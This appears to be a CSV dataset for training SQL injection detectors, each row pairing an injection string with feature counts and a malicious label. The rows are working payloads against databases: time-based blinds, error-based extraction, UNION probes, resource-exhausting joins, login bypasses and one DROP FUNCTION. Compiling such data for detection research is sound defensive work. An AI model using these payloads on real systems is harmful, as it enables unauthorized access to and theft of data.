Query,Singlequotes,Doublequotes,Punctuations,1-linecmt,Mulline-cmt,Spaces,Safekywrd,Harmflkywrd,Percentages,Log_oprtr,Operator,Nulls,Hex-dec,Db_info,Roles,Ntwr_cmds,Lang_cmds,Alphabets,Digits,Spl_char,Label
 (  select top 1,0,0,1,0,0,4,1,0,0,0,0,0,0,0,0,0,1,9,1,0,1
1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,4,0,8,0,0,12,3,1,0,4,4,0,0,0,0,1,0,22,2,4,1
 or ''*',3,0,3,0,0,2,1,0,0,1,2,0,0,0,0,0,0,2,0,3,1
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,0,4,23,0,0,29,3,1,2,3,7,0,3,0,0,0,1,39,35,4,1
"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""ksrh""  =  ""ksrh",0,4,18,0,0,35,3,7,0,4,7,0,0,0,7,0,1,120,12,4,1
"1  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",2,0,12,0,0,18,3,1,0,5,7,0,0,0,0,0,0,32,15,2,1
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'hstg' like 'hstg",4,0,14,0,0,31,4,7,0,5,7,0,0,0,7,0,1,124,12,4,1
"1%'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  '%'  =  '",4,0,13,0,0,18,2,0,2,4,8,0,0,0,0,0,0,9,13,4,1
"1  )   where 7748  =  7748 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,0,10,0,0,27,2,4,0,2,7,0,0,0,0,0,1,77,17,0,1
"-1139  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",0,0,19,0,0,41,8,2,0,6,9,0,2,0,0,0,1,63,37,0,1
1'   )    )     )   and sleep  (  5  )   and    (    (     (  'vbck' like 'vbck,4,0,12,0,0,16,3,1,0,5,5,0,0,0,0,1,0,23,2,4,1
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'gkku' like 'gkku",4,0,16,0,0,28,3,0,0,4,11,0,0,0,0,0,0,51,16,4,1
" select * from users where id  =  1 or ""@;""  =  1 or 1  =  1 -- 1",0,2,5,1,0,18,3,0,0,2,8,0,0,0,1,0,1,26,5,2,1
select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,3,0,7,0,0,11,2,1,0,2,3,0,0,0,0,1,1,24,1,3,1
1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'mgfd'  =  'mgfd,4,0,10,0,0,16,2,0,0,4,7,0,0,0,0,0,0,14,13,4,1
"1%"" and elt  (  5345  =  8751,8751  )   and ""%""  =  """,0,4,7,0,0,12,2,0,2,4,8,0,0,0,0,0,0,9,13,4,1
"1' where 2774  =  2774 union all select null,null,null,null,null#",1,0,5,0,0,9,4,0,0,1,2,5,0,0,0,0,1,39,9,1,1
"1""   )    )    as thoj where 1577  =  1577 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,1,31,0,0,56,2,8,0,2,16,2,0,0,0,0,0,82,33,1,1
select   (  case when   (  1275  =  7674  )   then 1275 else 1275*  (  select 1275 from information_schema.character_sets  )   end  )  #,0,0,7,0,0,22,7,2,0,2,4,0,0,0,0,0,2,65,20,0,1
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""lgwe"" like ""lgwe",0,4,37,0,0,74,4,1,0,5,27,0,0,0,0,0,1,96,49,4,1
select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,0,0,10,0,0,29,3,3,0,1,5,0,0,0,0,0,2,56,14,0,1
"1' in boolean mode  )   union all select null,null#",1,0,3,0,0,9,5,0,0,2,2,2,0,0,0,0,1,35,1,1,1
"-8312%""   )    )    union all select 4972--",0,1,6,0,0,7,4,0,1,1,5,0,0,0,0,0,1,14,8,1,1
"1%' or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0,12,0,0,20,6,3,1,5,10,0,0,0,0,0,1,64,8,1,1
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,3,0,8,0,0,20,4,1,0,5,8,0,0,0,0,0,1,66,2,3,1
"1'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'dfsj'  =  'dfsj",4,0,15,0,0,24,3,0,0,4,7,0,0,0,0,0,1,43,13,4,1
"-7107""   )    )     )   order by 1#",0,1,5,0,0,7,2,0,0,1,2,0,0,0,0,0,0,7,5,1,1
"1'||  (  select 'jfxs' from dual where 5485  =  5485 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",3,0,25,0,0,45,3,5,0,3,15,1,0,0,0,0,1,76,33,3,1
"1""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1,16,0,0,31,2,7,0,1,5,0,0,0,7,0,1,108,12,1,1
1 where 1015  =  1015,0,0,0,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
1 where 7802  =  7802,0,0,0,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,0,1
"1%' and make_set  (  8403  =  8403,8899  )   and '%'  =  '",4,0,7,0,0,12,4,0,2,4,8,0,0,0,0,0,0,13,13,4,1
1'+  (  select hett where 7228  =  7228,1,0,2,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,1,1
"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",1,0,13,0,0,12,5,0,0,1,6,0,0,0,0,0,2,29,48,1,1
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""whld""  =  ""whld",0,4,26,0,0,32,1,1,0,2,3,0,2,0,0,0,0,60,24,4,1
-7742  )   as tgzq where 7842  =  7842 or 2062  =  1563,0,0,2,0,0,12,1,1,0,1,4,0,0,0,0,0,0,13,20,0,1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",3,0,16,0,0,35,8,1,0,8,11,0,0,0,0,0,2,120,2,3,1
"1%""   )    )     )   and make_set  (  8191  =  7813,7813  )   and    (    (     (  ""%""  =  """,0,4,13,0,0,18,4,0,2,4,8,0,0,0,0,0,0,13,13,4,1
1'||  (  select 'ucro' where 9912  =  9912 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,3,0,10,0,0,21,3,1,0,2,8,0,0,0,0,1,2,35,18,3,1
"1 or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,0,5,0,0,12,1,1,0,1,2,0,0,0,0,1,0,10,10,0,1
"-3747""  )   union all select 8962,8962,8962,8962,8962#",0,1,7,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,24,1,1
1   )    )    as qsos where 2721  =  2721 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,0,0,12,0,0,26,3,2,0,1,5,0,0,0,0,1,2,41,10,0,1
"1%'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",4,0,36,0,0,57,3,7,2,4,18,2,0,0,0,0,0,74,29,4,1
"1""   )    )    as aamh where 7432  =  7432   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",0,1,31,0,0,59,5,8,0,3,13,1,0,0,1,0,1,118,42,1,1
1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1
"1 where 6169  =  6169   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",0,0,28,0,0,55,5,7,0,3,13,1,0,0,1,0,1,112,42,0,1
"1  )   where 6788  =  6788 union all select null,null,null,null,null,null,null,null,null--",0,0,11,0,0,10,4,0,0,1,4,9,0,0,0,0,1,55,9,0,1
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",1,0,38,0,0,68,2,8,0,1,12,2,0,0,0,0,1,104,35,1,1
select   (  case when   (  1039  =  5127  )   then 1039 else 1039*  (  select 1039 from information_schema.character_sets  )   end  )  #,0,0,7,0,0,22,7,2,0,2,4,0,0,0,0,0,2,65,20,0,1
"-8034"" or 8571  =  8571--",0,1,4,0,0,5,1,0,0,1,5,0,0,0,0,0,0,2,12,1,1
"  (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",0,0,9,0,0,15,5,3,0,4,5,0,0,0,0,0,1,62,3,0,1
"1""  )   where 1614  =  1614 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",0,1,19,0,0,27,2,1,0,1,5,0,3,0,0,0,1,41,43,1,1
"select * from generate_series  (  7754,7754,case when   (  7754  =  1252  )   then 1 else 0 end  )   limit 1--",0,0,8,0,0,20,1,1,0,0,4,0,0,0,0,0,1,48,19,0,1
admin' or '1'  =  '1,4,0,4,0,0,5,2,0,0,2,3,0,0,0,1,0,0,7,2,4,1
1 and sleep  (  5  )  #,0,0,2,0,0,7,1,1,0,2,2,0,0,0,0,1,0,8,2,0,1
"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""buzb""  =  ""buzb",0,4,33,0,0,71,4,1,0,5,28,0,0,0,0,0,1,100,45,4,1
"1%""   )    )    union all select null,null,null,null,null,null,null--",0,1,11,0,0,7,4,0,1,1,4,7,0,0,0,0,1,42,1,1,1
-7175' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'upzo'  =  'upzo,4,0,34,0,0,71,4,1,0,4,28,0,0,0,0,0,1,99,48,4,1
-2784  )   where 5261  =  5261 or 3472  =  1728#,0,0,2,0,0,10,1,0,0,1,4,0,0,0,0,0,0,7,20,0,1
"-8144'  )   where 1691  =  1691 or elt  (  7246  =  7816,7816  )  --",1,0,8,0,0,14,1,0,0,1,6,0,0,0,0,0,0,10,24,1,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   6977  =  6977",0,0,7,0,0,21,2,4,0,2,4,0,0,0,0,0,1,72,12,0,1
1  )   where 4600  =  4600 or sleep  (  5  )  --,0,0,5,0,0,12,1,1,0,1,4,0,0,0,0,1,0,12,10,0,1
"1' where 8360  =  8360 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,0,15,0,0,29,1,0,0,1,11,0,0,0,0,0,0,41,24,1,1
"-8790'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'nsze' like 'nsze",4,0,42,0,0,81,6,14,0,5,18,0,0,0,0,0,2,106,50,4,1
-3088' or 6872  =  6872 and 'miwk'  =  'miwk,4,0,5,0,0,9,2,0,0,3,6,0,0,0,0,0,0,13,12,4,1
"1'  )   union all select null,null,null,null,null,null,null,null,null#",1,0,10,0,0,6,4,0,0,1,1,9,0,0,0,0,1,50,1,1,1
1%'   )    )    union all select null--,1,0,5,0,0,7,4,0,1,1,4,1,0,0,0,0,1,18,1,1,1
"-9122  )   as sdlg where 1546  =  1546 union all select 1546,1546,1546,1546,1546,1546,1546--",0,0,10,0,0,12,4,1,0,1,5,0,0,0,0,0,1,25,40,0,1
"1"" union all select null,null,null,null,null,null#",0,1,6,0,0,5,4,0,0,1,1,6,0,0,0,0,1,38,1,1,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",0,0,7,0,0,16,2,0,0,2,4,0,0,0,0,0,1,32,16,0,1
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,0,0,5,0,0,14,2,1,0,2,3,0,0,0,0,1,1,20,10,0,1
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",4,0,18,0,0,35,3,7,0,4,7,0,0,0,7,0,1,120,12,4,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""%""  =  """,0,3,15,0,0,27,2,0,1,2,10,0,0,0,0,0,1,51,10,3,1
"1""  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""ureu"" like ""ureu",0,4,24,0,0,37,6,1,0,4,6,0,3,0,0,0,3,58,32,4,1
"1' where 3612  =  3612 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,0,27,0,0,49,12,2,0,7,13,0,2,0,0,0,3,102,43,1,1
-3540 where 7302  =  7302 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,0,0,32,0,0,72,3,1,0,2,28,0,0,0,0,0,1,93,56,0,1
1 where 5311  =  5311 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,0,0,8,0,0,22,3,1,0,1,3,0,0,0,0,1,2,35,10,0,1
" select * from users where id  =  1 or "".{"" or 1  =  1 -- 1",0,2,6,1,0,16,3,0,0,2,7,0,0,0,1,0,1,26,4,2,1
"1""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",0,1,16,0,0,26,1,0,0,2,11,0,0,0,0,0,0,37,15,1,1
"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",0,0,7,0,0,16,4,0,0,4,6,0,0,0,0,0,0,13,21,0,1
"1'||  (  select 'zrea' from dual where 1223  =  1223 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",5,0,17,0,0,27,4,1,0,4,11,0,0,0,0,0,1,54,23,5,1
"1"" where 7879  =  7879",0,1,1,0,0,5,0,0,0,0,1,0,0,0,0,0,0,5,9,1,1
"1'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'sied'  =  'sied",4,0,17,0,0,27,3,3,0,4,7,0,0,0,0,0,1,83,8,4,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori",3,0,11,0,0,17,5,0,0,5,6,0,0,0,0,0,1,44,8,3,1
-9103' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'nlvq'  =  'nlvq,4,0,34,0,0,71,4,1,0,4,28,0,0,0,0,0,1,99,48,4,1
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",3,0,6,1,0,23,5,1,0,1,8,0,0,0,1,0,2,64,6,3,1
 or 1  =  1 --,0,0,2,0,0,5,1,0,0,1,4,0,0,0,0,0,0,2,2,0,1
/**/or/**/1/**/  =  /**/1,0,0,0,0,8,3,1,0,0,1,18,0,0,0,0,0,0,2,2,0,1
"1""   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   ""rurz""  =  ""rurz",0,4,20,0,0,32,2,0,0,3,11,0,0,0,0,0,0,47,16,4,1
1%'   )    )    rlike   (  select   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    and    (    (   '%'  =  ',4,0,14,0,0,27,3,1,2,3,7,0,1,0,0,0,1,34,13,4,1
"-2626%'  )   or elt  (  7513  =  8586,8586  )   and   (  '%'  =  '",4,0,10,0,0,14,2,0,2,3,8,0,0,0,0,0,0,8,16,4,1
-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh,4,0,7,0,0,11,3,0,0,4,6,0,0,0,0,0,0,17,12,4,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""jkfk""  =  ""jkfk",0,3,8,0,0,19,2,4,0,2,4,0,0,0,0,0,1,80,4,3,1
"1'||  (  select 'ojdz' where 7350  =  7350 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",4,0,16,0,0,36,3,7,0,2,9,0,0,0,7,0,2,124,20,4,1
"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",1,0,8,0,0,9,5,0,0,2,3,0,0,0,0,0,1,27,28,1,1
1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,1,0,36,0,0,73,3,13,0,3,14,0,0,0,0,0,1,78,47,1,1
" select * from users where id  =  1 or 1#""?  =  1 or 1  =  1 -- 1",0,1,4,1,0,18,3,0,0,2,8,0,0,0,1,0,1,26,6,1,1
"1%""  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",0,1,7,0,0,13,1,1,1,1,3,0,0,0,0,1,0,10,10,1,1
"-1263""  )   or 9323  =  9323#",0,1,3,0,0,6,1,0,0,1,3,0,0,0,0,0,0,2,12,1,1
"1 where 7362  =  7362 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",2,0,13,0,0,22,3,1,0,5,10,0,0,0,0,0,0,37,23,2,1
1'+  (  select 'vjoj' where 5348  =  5348,3,0,4,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,3,1
-5962   )    )    as jbqv where 2583  =  2583 or 7496  =  8560--,0,0,5,0,0,13,1,1,0,1,6,0,0,0,0,0,0,13,20,0,1
-3458'  )   where 2053  =  2053 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,0,36,0,0,75,2,2,0,1,27,0,0,0,0,0,1,95,56,1,1
if  (  4735  =  8907  )   select 4735 else drop function qigo--,0,0,4,0,0,12,1,1,0,0,3,0,0,0,0,0,2,28,12,0,1
"-1639   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   3318  =  3318",0,0,38,0,0,78,3,1,0,3,27,0,0,0,0,0,1,83,60,0,1
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",4,0,20,0,0,37,3,7,0,4,7,0,0,0,7,0,1,120,12,4,1
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",0,0,9,0,0,5,4,0,0,1,2,0,0,0,0,0,1,14,40,0,1
"1',  (  select * from generate_series  (  2636,2636,case when   (  2636  =  7071  )   then 1 else 0 end  )   limit 1  )  ",1,0,10,0,0,23,1,1,0,0,2,0,0,0,0,0,1,48,20,1,1
"-3347'+  (  select xuzs where 1076  =  1076 union all select 1076,1076,1076,1076,1076--",1,0,9,0,0,12,5,0,0,1,6,0,0,0,0,0,2,29,32,1,1
select   (  case when   (  2352  =  8672  )   then 2352 else 2352*  (  select 2352 from information_schema.character_sets  )   end  )  #,0,0,7,0,0,22,7,2,0,2,4,0,0,0,0,0,2,65,20,0,1
"1   )    )    union all select null,null,null,null,null,null,null,null#",0,0,9,0,0,7,4,0,0,1,1,8,0,0,0,0,1,46,1,0,1
"-9087"" order by 1#",0,1,2,0,0,4,2,0,0,1,2,0,0,0,0,0,0,7,5,1,1
1'+  (  select pagd where 2484  =  2484,1,0,2,0,0,8,1,0,0,0,2,0,0,0,0,0,1,15,9,1,1
"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,0,12,0,0,32,3,3,0,1,3,0,0,0,0,0,2,56,12,1,1
""";waitfor delay '0:0:__TIME__'--",2,1,8,0,0,3,1,1,0,1,3,0,0,0,0,1,0,16,2,3,1
"1,  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   ",0,0,9,0,0,22,2,1,0,0,2,0,0,0,0,0,2,31,12,0,1
"1"" and sleep  (  5  )   and ""tdid"" like ""tdid",0,4,6,0,0,10,3,1,0,5,5,0,0,0,0,1,0,23,2,4,1
"1   )    )    as midl where 9046  =  9046 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",0,0,16,0,0,33,1,1,0,2,12,0,0,0,0,0,0,48,24,0,1
 union select,0,0,0,0,0,2,3,0,0,0,0,0,0,0,0,0,1,11,0,0,1
"-4329'  )   union all select 1353,1353,1353,1353,1353,1353#",1,0,8,0,0,6,4,0,0,1,2,0,0,0,0,0,1,14,28,1,1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   '%'  =  ',3,0,13,0,0,21,3,1,1,2,5,0,0,0,0,1,2,28,1,3,1
"1  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  ",0,0,13,0,0,25,1,0,0,2,9,0,0,0,0,0,0,37,16,0,1
1'   )    )    and 4595  =  4595#,1,0,3,0,0,7,1,0,0,2,3,0,0,0,0,0,0,3,9,1,1
select   (  case when   (  6204  =  1913  )   then 6204 else 6204*  (  select 6204 from information_schema.character_sets  )   end  )  #,0,0,7,0,0,22,7,2,0,2,4,0,0,0,0,0,2,65,20,0,1
"-4068'   )    )     )   union all select 9491,9491,9491--",1,0,9,0,0,8,4,0,0,1,4,0,0,0,0,0,1,14,16,1,1
"1%""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""%""  =  """,0,4,17,0,0,31,3,4,2,3,8,0,0,0,0,0,1,74,9,4,1
"-9574%'   )    )    union all select 5645,5645,5645,5645,5645,5645,5645--",1,0,12,0,0,7,4,0,1,1,5,0,0,0,0,0,1,14,32,1,1
"1' in boolean mode  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   #",1,0,17,0,0,26,3,1,0,3,4,0,3,0,0,0,1,50,35,1,1
"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,0,7,0,0,19,1,1,0,1,3,0,1,0,0,0,0,28,27,1,1
"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,0,10,0,0,19,7,0,0,6,8,0,0,0,5,0,1,62,10,1,1
